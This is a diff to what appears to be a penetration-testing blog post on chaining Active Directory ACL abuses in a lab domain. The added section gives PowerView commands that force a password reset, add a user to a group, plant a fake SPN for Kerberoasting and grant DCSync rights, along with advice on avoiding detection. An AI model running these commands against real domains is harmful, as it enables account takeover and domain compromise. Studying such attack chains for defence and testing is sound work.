@@ -123,6 +123,50 @@ The last command is particularly useful — it shows you which objects the curre
 
 We'll use bloodyAD throughout this post to execute each step of the chain, alongside PowerView for Windows-side verification where relevant.
 
+### PowerView — When You're on Windows
+
+If you land on a Windows host inside the domain — whether through a shell on a workstation, a C2 agent, or any other means — bloodyAD isn't your tool. Instead you reach for **PowerView**, a PowerShell module from PowerSploit that talks to AD natively through .NET LDAP calls.
+
+The same enumeration, different syntax:
+
+```powershell
+# Import PowerView
+Import-Module .\PowerView.ps1
+
+# Check what r.nilson can write to
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "r.nilson" }
+
+# Get group membership of j.carter
+Get-DomainGroupMember -Identity "HelpDesk Tier III"
+
+# Check ACL on a specific object
+Get-DomainObjectAcl -Identity "Web Server Admins" -ResolveGUIDs
+
+# Find all users with ForceChangePassword rights
+Get-DomainObjectAcl -ResolveGUIDs | Where-Object { $_.ObjectAceType -match "User-Force-Change-Password" }
+```
+
+For abuse, the same primitives work from PowerView:
+
+```powershell
+# Change j.carter's password
+$NewPassword = ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity j.carter -AccountPassword $NewPassword
+
+# Add r.nilson to Web Server Admins
+Add-DomainGroupMember -Identity "Web Server Admins" -Members r.nilson
+
+# Set SPN on m.harris
+Set-DomainObject -Identity m.harris -Set @{servicePrincipalName='fake/corp.local'}
+
+# Grant DCSync rights
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity r.nilson -Rights DCSync
+```
+
+The concepts are identical — the tooling just adapts to where you're running from. Linux with valid credentials — bloodyAD over LDAP. Windows shell inside the domain — PowerView through native AD interfaces. Either way, you're reading and writing the same attributes on the same objects.
+
+One thing worth noting: PowerView's `Find-InterestingDomainAcl` generates a significant amount of LDAP traffic since it pulls ACLs for every object in the domain. If OPSEC matters, be deliberate — target specific objects rather than scanning everything at once.
+
 ---
 
 ## The Chain — Step by Step
@@ -272,7 +316,7 @@ CN=svc_exchange,CN=Users,DC=corp,DC=local
 CN=m.harris,CN=Users,DC=corp,DC=local
 ```
 
-`svc_exchange` already has SPNs registered by Exchange itself — no need to touch it, just Kerberoast it directly. But `m.harris` is a regular user account in this group with no SPN set. That's our target for fake SPN injection.
+`svc_exchange` already has SPNs registered by Exchange itself — no need to touch it, just Kerberoast it directly. But we're more interested in `m.harris` — a regular user account in this group with no SPN set. Why? Because if we crack m.harris, we get an authenticated context inside the Exchange Windows Permissions group, which has WriteDacl on the domain object. That's our path to DCSync. svc_exchange might crack too, but m.harris is the more interesting target given what his group membership gives us.
 
 We set a fake SPN on m.harris:
 
